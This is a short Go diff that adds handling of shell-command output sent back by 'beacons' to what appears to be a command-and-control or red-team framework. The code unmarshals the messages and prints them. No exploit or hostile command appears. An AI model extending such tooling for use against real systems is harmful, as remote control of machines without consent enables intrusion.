@@ -337,6 +337,8 @@ func (h *handler) OnBeaconSend(send *protocol.Send) {
 	msgType := convert.BytesToUint32(send.Message[:4])
 	send.Message = send.Message[4:]
 	switch msgType {
+	case messages.CMDShellOutput:
+		h.handleShellOutput(send)
 	case messages.CMDBeaconLog:
 		h.handleBeaconLog(send)
 	case messages.CMDTest:
@@ -345,6 +347,18 @@ func (h *handler) OnBeaconSend(send *protocol.Send) {
 		const format = "beacon send unknown message\n%s\ntype: 0x%08X\n%s"
 		h.logf(logger.Exploit, format, send.RoleGUID.Print(), msgType, spew.Sdump(send))
 	}
+}
+
+func (h *handler) handleShellOutput(send *protocol.Send) {
+	defer h.logPanic("handler.handleShellOutput")
+	output := new(messages.ShellOutput)
+	err := msgpack.Unmarshal(send.Message, output)
+	if err != nil {
+		const format = "invalid shell output data\nerror: %s"
+		h.logfWithInfo(logger.Exploit, format, &send.RoleGUID, send, err)
+		return
+	}
+	fmt.Println(string(output.Output))
 }
 
 func (h *handler) handleBeaconLog(send *protocol.Send) {
